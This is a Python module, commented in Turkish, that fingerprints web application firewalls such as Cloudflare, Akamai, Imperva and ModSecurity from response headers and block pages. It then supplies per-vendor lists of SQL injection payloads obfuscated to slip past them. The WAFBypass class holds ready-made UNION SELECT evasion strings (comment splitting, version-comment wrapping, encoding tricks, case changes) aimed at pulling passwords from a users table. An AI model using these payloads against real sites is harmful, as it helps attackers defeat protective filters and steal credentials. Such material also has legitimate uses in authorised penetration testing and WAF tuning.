"""
WAF tespit ve bypass modülü.
Bu modül, Web Application Firewall (WAF) tespiti ve bypass teknikleri sağlar.
"""

import re
import logging
from dataclasses import dataclass
from typing import List, Optional
from enum import Enum

# Loglama yapılandırması
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class WAFType(Enum):
    """WAF türleri."""
    UNKNOWN = "Unknown"
    CLOUDFLARE = "Cloudflare"
    AKAMAI = "Akamai"
    IMPERVA = "Imperva"
    F5_ASM = "F5 ASM"
    MODSECURITY = "ModSecurity"
    FORTIWEB = "FortiWeb"

@dataclass
class WAFFingerprint:
    """WAF parmak izi sınıfı."""
    waf_type: WAFType
    headers: List[str]
    response_patterns: List[str]
    block_patterns: List[str]

@dataclass
class WAFDetectionResult:
    """WAF tespit sonucu sınıfı."""
    detected: bool
    waf_type: WAFType
    confidence: float
    details: str

class WAFDetector:
    """WAF tespit sınıfı."""
    
    def __init__(self):
        """WAF tespit sınıfı başlatıcı."""
        self.fingerprints = self._load_fingerprints()
    
    def _load_fingerprints(self) -> List[WAFFingerprint]:
        """WAF parmak izlerini yükler."""
        return [
            WAFFingerprint(
                waf_type=WAFType.CLOUDFLARE,
                headers=["cf-ray", "cf-wan-error"],
                response_patterns=[
                    r"cloudflare",
                    r"ray id:",
                    r"error 1015"
                ],
                block_patterns=[
                    r"blocked by cloudflare",
                    r"attention required!",
                    r"please wait while we verify your browser"
                ]
            ),
            WAFFingerprint(
                waf_type=WAFType.AKAMAI,
                headers=["x-akamai-transformed", "akamai-origin-hop"],
                response_patterns=[
                    r"akamai",
                    r"reference #[0-9a-f.]+",
                    r"your request has been blocked"
                ],
                block_patterns=[
                    r"access denied",
                    r"you don't have permission to access",
                    r"your ip address has been blocked"
                ]
            ),
            WAFFingerprint(
                waf_type=WAFType.IMPERVA,
                headers=["x-iinfo", "x-cdn"],
                response_patterns=[
                    r"imperva",
                    r"incapsula",
                    r"_incap_"
                ],
                block_patterns=[
                    r"blocked by incapsula",
                    r"contact site administrator",
                    r"incident id:"
                ]
            ),
            WAFFingerprint(
                waf_type=WAFType.F5_ASM,
                headers=["x-cnection", "x-wa-info"],
                response_patterns=[
                    r"the requested url was rejected",
                    r"please consult with your administrator"
                ],
                block_patterns=[
                    r"request rejected",
                    r"the requested url was rejected",
                    r"security policy violation"
                ]
            ),
            WAFFingerprint(
                waf_type=WAFType.MODSECURITY,
                headers=["x-mod-security", "x-powered-by"],
                response_patterns=[
                    r"mod_security",
                    r"not acceptable",
                    r"error 403"
                ],
                block_patterns=[
                    r"access denied",
                    r"mod_security action",
                    r"blocked by mod_security"
                ]
            ),
            WAFFingerprint(
                waf_type=WAFType.FORTIWEB,
                headers=["x-fortigate", "x-fortiweb-result"],
                response_patterns=[
                    r"fortiweb",
                    r"fortigate",
                    r"forticache"
                ],
                block_patterns=[
                    r"blocked by fortiweb",
                    r"attack detected",
                    r"please contact the system admin"
                ]
            )
        ]
    
    def detect_waf(self, headers: dict, response_text: str) -> WAFDetectionResult:
        """
        WAF varlığını tespit eder.
        
        Args:
            headers: HTTP yanıt başlıkları
            response_text: HTTP yanıt içeriği
            
        Returns:
            WAF tespit sonucu
        """
        max_confidence = 0.0
        detected_waf = WAFType.UNKNOWN
        detection_details = []
        
        for fingerprint in self.fingerprints:
            confidence = 0.0
            details = []
            
            # Header kontrolü
            for header in fingerprint.headers:
                if any(h.lower() == header.lower() for h in headers):
                    confidence += 0.3
                    details.append(f"Header bulundu: {header}")
            
            # Yanıt pattern kontrolü
            for pattern in fingerprint.response_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    confidence += 0.2
                    details.append(f"Yanıt pattern'i bulundu: {pattern}")
            
            # Engelleme pattern kontrolü
            for pattern in fingerprint.block_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    confidence += 0.5
                    details.append(f"Engelleme pattern'i bulundu: {pattern}")
            
            if confidence > max_confidence:
                max_confidence = confidence
                detected_waf = fingerprint.waf_type
                detection_details = details
        
        return WAFDetectionResult(
            detected=max_confidence > 0.5,
            waf_type=detected_waf,
            confidence=max_confidence,
            details="\n".join(detection_details)
        )

class WAFBypass:
    """WAF bypass teknikleri sınıfı."""
    
    @staticmethod
    def get_bypass_payloads(waf_type: WAFType) -> List[str]:
        """
        WAF türüne göre bypass payload'ları üretir.
        
        Args:
            waf_type: WAF türü
            
        Returns:
            Bypass payload listesi
        """
        payloads = []
        
        # Genel bypass teknikleri
        payloads.extend([
            # Boşluk alternatifi karakterler
            "SELECT/**/password/**/FROM/**/users",
            "UNION"+chr(9)+"SELECT"+chr(9)+"password",
            "UNION"+chr(10)+"SELECT"+chr(10)+"password",
            
            # Yorum kullanımı
            "UN/**/ION/**/SE/**/LECT",
            "UN/**/ION/**/ALL/**/SE/**/LECT",
            "/*!UNION*//*!SELECT*/",
            
            # URL encoding
            "UNION%20SELECT",
            "UNION%09SELECT",
            "UNION%0ASELECT",
            
            # Case manipulation
            "UnIoN/**/SeLeCt",
            "UniOn/**/AlL/**/SeLeCt",
            
            # Hex encoding
            "UNION SELECT 0x70617373776F7264",  # 'password' in hex
            
            # Double URL encoding
            "UNION%2520SELECT",
            
            # Unicode encoding
            "UNION\u0020SELECT",
            
            # Alternative operators
            "1 || 1",
            "1 | 1",
            "1 && 1",
            "1 & 1"
        ])
        
        # WAF spesifik bypass teknikleri
        if waf_type == WAFType.CLOUDFLARE:
            payloads.extend([
                "/*!50000UnIoN*//*!50000SeLeCt*/",
                "/*!12345UNION*//*!12345SELECT*/",
                "%23%0ASELECT%23%0A",
                "%0ASELECT%0A"
            ])
        elif waf_type == WAFType.MODSECURITY:
            payloads.extend([
                "SELECT/*&a=*/password/*&a=*/FROM/*&a=*/users",
                "UNION/*&a=*/SELECT/*&a=*/password",
                "/*!50000SELECT*/",
                "/*!50000UNION*//*!50000SELECT*/"
            ])
        elif waf_type == WAFType.IMPERVA:
            payloads.extend([
                "SELECT'password'FROM'users'",
                "UNION'SELECT'password",
                "/**//*!12345UNION SELECT*//**/",
                "/**//*!50000UNION SELECT*//**/"
            ])
        
        return payloads 